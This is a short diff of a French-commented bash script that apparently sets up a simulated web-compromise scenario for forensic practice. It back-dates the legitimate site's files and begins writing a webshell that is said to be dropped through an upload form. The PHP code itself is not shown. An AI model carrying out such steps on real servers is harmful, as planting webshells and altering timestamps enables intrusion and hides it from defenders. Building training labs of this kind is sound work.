@@ -44,6 +44,12 @@ ts() { date -d "@$(( BASE + $1 ))" '+%d/%b/%Y:%H:%M:%S +0000'; }        # format
 tss() { date -d "@$(( BASE + $1 ))" '+%b %e %H:%M:%S'; }               # format syslog
 
 ########################################
+# 0. Vieillissement du site legitime (deploiement un mois avant l'incident)
+# pour que le webshell, date de l'incident, ressorte comme fichier recent.
+########################################
+find /var/www/html -type f -exec touch -d "@$(( BASE - 2592000 ))" {} + 2>/dev/null || true
+
+########################################
 # 1. Webshell depose via le formulaire d'upload
 ########################################
 cat > "$SHELL_PATH" << 'PHP'
